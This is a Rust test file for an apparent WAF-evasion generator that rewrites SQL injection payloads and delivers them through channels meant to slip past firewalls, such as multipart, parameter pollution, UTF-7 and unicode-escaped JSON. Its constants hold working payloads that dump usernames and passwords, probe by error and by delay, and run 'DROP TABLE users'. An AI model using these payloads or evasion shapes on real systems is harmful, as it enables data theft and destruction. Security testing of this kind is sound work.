//! Phase-B equivalence-generator soundness battery.
//!
//! The generator's contract: it emits an (effectively infinite) space
//! of payloads, EVERY one of which still executes the original
//! exploit, and it can NEVER emit a non-attack. These tests prove that
//! at scale — including a real boolean evaluator that proves the
//! generated tautologies are *actually true* (truth, not shape).

use wafrift_grammar::grammar::equiv::sql as esql;
use wafrift_grammar::grammar::equiv::{self, DeliveryShape, Dialect, EquivConfig};

const STRUCTURED: &[&str] = &[
    "1 UNION SELECT username,password FROM users-- -",
    "1' UNION SELECT username,password FROM users-- -",
    "1 AND extractvalue(1,concat(0x7e,(SELECT version())))",
    "1 AND updatexml(1,concat(0x7e,(SELECT database())),1)",
    "1; DROP TABLE users-- -",
    "1 AND (SELECT 1 FROM (SELECT SLEEP(5))x)",
    "1 UNION SELECT * FROM (SELECT username FROM users)z-- -",
    "1' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)-- -",
];

const NON_STRUCTURED: &[&str] = &[
    "1' OR '1'='1",
    "1' OR 1=1-- -",
    "admin'--",
    "1' OR '1'='1'#",
    "1') OR ('1'='1",
    "1 OR 1=1",
    "' OR 'a'='a",
    "1\" OR \"1\"=\"1",
];

fn cfg(seed: u64) -> EquivConfig {
    EquivConfig {
        seed,
        max: 64,
        verify: true,
        vary_delivery: true,
        param: "id".into(),
        force_delivery: None,
    }
}

// ───────────────────────── tokenizer round-trip ────────────────────
#[test]
fn tokenizer_round_trips_losslessly() {
    let cases = [
        "1' OR '1'='1",
        "1 UNION SELECT a,b FROM users-- -",
        "1 AND extractvalue(1,concat(0x7e,(SELECT version())))",
        "1; DROP TABLE users-- -",
        "admin'--",
        "1/**/OR/**/1=1",
        "1e0' OR 1.5=1.5",
        "0xDEADBEEF",
        "a_b.c (1,2)\t\n3",
        "' OR ''='",
    ];
    for c in cases {
        assert_eq!(
            esql::round_trip(c),
            c,
            "tokenizer lost/changed data for {c:?}"
        );
    }
}

// ───────────────────────── determinism ─────────────────────────────
#[test]
fn generation_is_deterministic_per_seed() {
    for p in NON_STRUCTURED.iter().chain(STRUCTURED) {
        let a = equiv::equiv_sql(p, &cfg(42));
        let b = equiv::equiv_sql(p, &cfg(42));
        let c = equiv::equiv_sql(p, &cfg(43));
        let av: Vec<_> = a.iter().map(|x| (&x.payload, x.delivery.label())).collect();
        let bv: Vec<_> = b.iter().map(|x| (&x.payload, x.delivery.label())).collect();
        assert_eq!(av, bv, "seed 42 not reproducible for {p:?}");
        let cv: Vec<_> = c.iter().map(|x| (&x.payload, x.delivery.label())).collect();
        assert!(
            av != cv || av.len() < 3,
            "seed 42 vs 43 identical for {p:?} (no entropy)"
        );
    }
}

// ──────────────── soundness invariant at scale ─────────────────────
const CANNED_NON_ATTACKS: &[&str] = &[
    "'+0+'",
    "'-0-'",
    "1-0",
    "1*1",
    "0+1",
    "1/1",
    "",
    " ",
    "1",
    "1=1-- -only",
];

#[test]
fn every_emitted_member_still_executes_the_exploit() {
    let mut total = 0usize;
    for seed in 0..60u64 {
        for p in NON_STRUCTURED.iter().chain(STRUCTURED) {
            for m in equiv::equiv_sql(p, &cfg(seed)) {
                total += 1;
                assert!(
                    esql::still_executes(p, &m.payload),
                    "GENERATOR EMITTED A NON-ATTACK: {:?} from {p:?} (rules {:?}, seed {seed})",
                    m.payload,
                    m.rules
                );
                assert!(
                    !CANNED_NON_ATTACKS.contains(&m.payload.as_str()),
                    "generator emitted canned non-attack {:?} from {p:?}",
                    m.payload
                );
            }
        }
    }
    assert!(total > 5_000, "battery too small ({total} members)");
}

#[test]
fn structured_attacks_keep_every_structural_marker_and_are_never_tautology_swapped() {
    let markers: &[(&str, &[&str])] = &[
        (
            "1 UNION SELECT username,password FROM users-- -",
            &["union", "select", "from", "users"],
        ),
        (
            "1 AND extractvalue(1,concat(0x7e,(SELECT version())))",
            &["extractvalue", "concat", "select", "version"],
        ),
        ("1; DROP TABLE users-- -", &["drop", "table", "users"]),
        (
            "1 AND (SELECT 1 FROM (SELECT SLEEP(5))x)",
            &["select", "sleep", "from"],
        ),
    ];
    for (attack, must) in markers {
        for seed in 0..40u64 {
            for m in equiv::equiv_sql(attack, &cfg(seed)) {
                let norm = esql::normalize_pub(&m.payload);
                for kw in *must {
                    assert!(
                        norm.contains(kw),
                        "structured marker {kw:?} lost: {:?} (from {attack:?})",
                        m.payload
                    );
                }
                assert!(
                    !m.rules.contains(&"tautology_gen"),
                    "tautology_gen fired on a STRUCTURED attack {attack:?} -> {:?} (the rig!)",
                    m.payload
                );
            }
        }
    }
}

// ─────────── delivery joint algebra ────────────────────────────────
#[test]
fn identity_exploit_is_delivered_through_every_strong_vector() {
    // Even with ZERO string rewrites the UNMODIFIED structured exploit
    // must be offered via the empirically-proven WAF-blind shapes.
    let p = "1 UNION SELECT username,password FROM users-- -";
    let got = equiv::equiv_sql(p, &cfg(7));
    for want in ["multipart_file", "path_segment", "hpp_split", "json_body"] {
        assert!(
            got.iter()
                .any(|m| m.payload == p && m.delivery.label() == want),
            "unmodified structured exploit not delivered via {want}"
        );
    }
}

#[test]
fn vary_delivery_false_is_query_only() {
    let mut c = cfg(1);
    c.vary_delivery = false;
    for m in equiv::equiv_sql("1' OR '1'='1", &c) {
        assert_eq!(
            m.delivery.label(),
            "query",
            "vary_delivery=false leaked a non-query shape: {:?}",
            m.delivery
        );
    }
}

#[test]
fn delivery_labels_are_stable() {
    let p = "1' OR '1'='1";
    let got = equiv::equiv_sql(p, &cfg(99));
    let labels: std::collections::HashSet<_> = got.iter().map(|m| m.delivery.label()).collect();
    assert!(
        labels.len() >= 4,
        "delivery algebra not exercised: {labels:?}"
    );
    for l in labels {
        assert!(
            [
                "query",
                "form_body",
                "json_body",
                "multipart_field",
                "multipart_file",
                "path_segment",
                "hpp_split",
                // 0.2.17 raw reflected channels (shared delivery_set);
                // valid for SQL too where transport-legal.
                "header_value",
                "cookie",
                // 0.2.18 third-body-axis + depth-defeat + GraphQL —
                // shared delivery_set, sound for SQL identically (the
                // backend SQL sink receives the same payload bytes
                // regardless of the JSON/XML/GraphQL transport envelope).
                "xml_body",
                "json_nested_deep",
                "graphql",
                // JSON-unicode-normalisation gap: payload value fully
                // `\uXXXX`-escaped; backend JSON parser decodes to the same
                // SQL bytes, WAF keyword-match misses the raw body.
                "json_unicode_body",
                // Charset confusion: UTF-7 multipart part; charset-honouring
                // backend decodes the same SQL bytes, WAF sees shift sequences.
                "utf7_multipart"
            ]
            .contains(&l),
            "unknown delivery label {l:?}"
        );
    }
}

// ─────────── literal-encoding dialect soundness ────────────────────
#[test]
fn hex_literal_encoding_marks_mysql_dialect() {
    // 0x.. integer literals are MySQL-specific; any member that used
    // hex encoding MUST be tagged MySql (sound-dialect tracking).
    let mut saw_hex = false;
    for seed in 0..50u64 {
        for m in equiv::equiv_sql("1 OR 7=7", &cfg(seed)) {
            if m.payload.contains("0x") && m.rules.contains(&"literal_encode") {
                saw_hex = true;
                assert_eq!(
                    m.dialect,
                    Dialect::MySql,
                    "hex-literal member not tagged MySql: {:?}",
                    m.payload
                );
            }
        }
    }
    assert!(
        saw_hex,
        "literal_encode never produced a hex form in 50 seeds"
    );
}

// ─────────── THE truth test: generated tautologies are TRUE ─────────
mod booleval {
    //! Minimal recursive-descent evaluator for the fragment gen_true /
    //! gen_false emit. Proves the generator's tautologies are tautologies.
    #[derive(Clone)]
    struct P<'a> {
        s: &'a [u8],
        i: usize,
    }
    impl<'a> P<'a> {
        fn ws(&mut self) {
            while self.i < self.s.len() && self.s[self.i].is_ascii_whitespace() {
                self.i += 1;
            }
        }
        fn eat(&mut self, kw: &str) -> bool {
            self.ws();
            let k = kw.as_bytes();
            if self.s[self.i..].len() >= k.len()
                && self.s[self.i..self.i + k.len()].eq_ignore_ascii_case(k)
            {
                self.i += k.len();
                true
            } else {
                false
            }
        }
        fn peek(&mut self, c: u8) -> bool {
            self.ws();
            self.i < self.s.len() && self.s[self.i] == c
        }
        // OR
        fn expr(&mut self) -> bool {
            let mut v = self.term();
            loop {
                self.ws();
                if self.eat("OR") {
                    let r = self.term();
                    v = v || r;
                } else {
                    break;
                }
            }
            v
        }
        // AND
        fn term(&mut self) -> bool {
            let mut v = self.fact();
            loop {
                self.ws();
                if self.eat("AND") {
                    let r = self.fact();
                    v = v && r;
                } else {
                    break;
                }
            }
            v
        }
        fn fact(&mut self) -> bool {
            self.ws();
            if self.eat("NOT") {
                return !self.fact();
            }
            if self.peek(b'(') {
                self.i += 1;
                let v = self.expr();
                self.ws();
                assert!(self.peek(b')'), "unbalanced paren");
                self.i += 1;
                return v;
            }
            self.cmp()
        }
        fn operand(&mut self) -> Val {
            self.ws();
            if self.peek(b'\'') {
                self.i += 1;
                let st = self.i;
                while self.i < self.s.len() && self.s[self.i] != b'\'' {
                    self.i += 1;
                }
                let s = String::from_utf8_lossy(&self.s[st..self.i]).to_string();
                self.i += 1; // closing '
                return Val::S(s);
            }
            // integer, optional `e0` suffix, optional `|0`/`^0` bitwise
            let st = self.i;
            while self.i < self.s.len()
                && (self.s[self.i].is_ascii_digit() || self.s[self.i] == b'-')
            {
                self.i += 1;
            }
            let mut n: i64 = std::str::from_utf8(&self.s[st..self.i])
                .unwrap()
                .parse()
                .unwrap();
            if self.i + 1 < self.s.len() && (self.s[self.i] == b'e' || self.s[self.i] == b'E') {
                self.i += 1;
                while self.i < self.s.len() && self.s[self.i].is_ascii_digit() {
                    self.i += 1;
                }
            }
            self.ws();
            if self.i < self.s.len() && (self.s[self.i] == b'|' || self.s[self.i] == b'^') {
                let op = self.s[self.i];
                self.i += 1;
                let st2 = self.i;
                while self.i < self.s.len() && self.s[self.i].is_ascii_digit() {
                    self.i += 1;
                }
                let m: i64 = std::str::from_utf8(&self.s[st2..self.i])
                    .unwrap()
                    .parse()
                    .unwrap();
                n = if op == b'|' { n | m } else { n ^ m };
            }
            Val::I(n)
        }
        fn cmp(&mut self) -> bool {
            let l = self.operand();
            self.ws();
            // BETWEEN / LIKE / IN
            if self.eat("BETWEEN") {
                let lo = self.operand();
                assert!(self.eat("AND"));
                let hi = self.operand();
                return l.i() >= lo.i() && l.i() <= hi.i();
            }
            if self.eat("LIKE") {
                let r = self.operand();
                return l == r;
            }
            if self.eat("IN") {
                self.ws();
                assert!(self.peek(b'('));
                self.i += 1;
                let mut hit = false;
                loop {
                    let v = self.operand();
                    if v == l {
                        hit = true;
                    }
                    self.ws();
                    if self.peek(b',') {
                        self.i += 1;
                        continue;
                    }
                    break;
                }
                assert!(self.peek(b')'));
                self.i += 1;
                return hit;
            }
            // operators
            let op = {
                self.ws();
                let two = &self.s[self.i..(self.i + 2).min(self.s.len())];
                if two == b"<=" || two == b">=" || two == b"!=" || two == b"<>" {
                    self.i += 2;
                    String::from_utf8_lossy(two).to_string()
                } else {
                    let c = self.s[self.i];
                    self.i += 1;
                    (c as char).to_string()
                }
            };
            let r = self.operand();
            match (l, r) {
                (Val::I(a), Val::I(b)) => match op.as_str() {
                    "=" => a == b,
                    "<" => a < b,
                    ">" => a > b,
                    "<=" => a <= b,
                    ">=" => a >= b,
                    "!=" | "<>" => a != b,
                    _ => panic!("op {op}"),
                },
                (Val::S(a), Val::S(b)) => match op.as_str() {
                    "=" => a == b,
                    "!=" | "<>" => a != b,
                    _ => panic!("str op {op}"),
                },
                _ => panic!("type mismatch"),
            }
        }
    }
    #[derive(PartialEq)]
    enum Val {
        I(i64),
        S(String),
    }
    impl Val {
        fn i(&self) -> i64 {
            match self {
                Val::I(x) => *x,
                Val::S(_) => panic!("str in numeric ctx"),
            }
        }
    }
    pub fn eval(s: &str) -> bool {
        let mut p = P {
            s: s.as_bytes(),
            i: 0,
        };
        let v = p.expr();
        p.ws();
        v
    }
}

#[test]
fn generated_tautologies_are_actually_true_and_falses_actually_false() {
    // The anti-rig core: prove the tautology grammar directly. Every
    // gen_true must evaluate TRUE and every gen_false FALSE under a
    // real boolean evaluator, across 1500 independent seeds.
    for seed in 0..1500u64 {
        let t = esql::_sample_truth(seed);
        assert!(
            booleval::eval(&t),
            "gen_true produced a NON-TRUE expression at seed {seed}: {t:?}"
        );
        let f = esql::_sample_false(seed);
        assert!(
            !booleval::eval(&f),
            "gen_false produced a TRUE expression at seed {seed}: {f:?}"
        );
    }
}

#[test]
fn tautology_swap_keeps_non_structured_payload_a_valid_attack() {
    // Integration: when tautology_gen fires, the whole payload still
    // executes (independently re-verified) and is not a canned stub.
    let mut fired = 0;
    for seed in 0..200u64 {
        for m in equiv::equiv_sql("1 OR 1=1", &cfg(seed)) {
            if m.rules.contains(&"tautology_gen") {
                fired += 1;
                assert!(
                    esql::still_executes("1 OR 1=1", &m.payload),
                    "tautology_gen produced unsound {:?}",
                    m.payload
                );
            }
        }
    }
    assert!(fired > 20, "tautology_gen barely exercised ({fired})");
}

// ─────────── negatives / robustness ────────────────────────────────
#[test]
fn junk_and_empty_never_panic_and_never_emit_non_attacks() {
    for j in [
        "",
        " ",
        "hello world",
        "????",
        "{}",
        "\u{1f600}\u{1f600}",
        "SELECT",
    ] {
        let v = equiv::equiv_sql(j, &cfg(3));
        for m in &v {
            assert!(
                esql::still_executes(j, &m.payload),
                "emitted unsound member {:?} for junk {j:?}",
                m.payload
            );
        }
    }
}

#[test]
fn end_to_end_public_api_shape() {
    let v = equiv::equiv_sql("1' OR '1'='1", &EquivConfig::default());
    assert!(!v.is_empty());
    assert!(v.len() <= EquivConfig::default().max);
    // Distinct (payload,delivery) pairs only.
    let mut seen = std::collections::HashSet::new();
    for m in &v {
        assert!(
            seen.insert((m.payload.clone(), m.delivery.label())),
            "duplicate member {:?}/{}",
            m.payload,
            m.delivery.label()
        );
        assert!(matches!(
            m.delivery,
            DeliveryShape::Query { .. }
                | DeliveryShape::FormBody { .. }
                | DeliveryShape::JsonBody { .. }
                | DeliveryShape::MultipartField { .. }
                | DeliveryShape::MultipartFile { .. }
                | DeliveryShape::PathSegment
                | DeliveryShape::HppSplit { .. }
                | DeliveryShape::HeaderValue { .. }
                | DeliveryShape::Cookie { .. }
                | DeliveryShape::XmlBody { .. }
                | DeliveryShape::JsonNestedDeep { .. }
                | DeliveryShape::GraphQLQuery { .. }
                | DeliveryShape::JsonUnicodeBody { .. }
                | DeliveryShape::Utf7MultipartField { .. }
        ));
    }
}
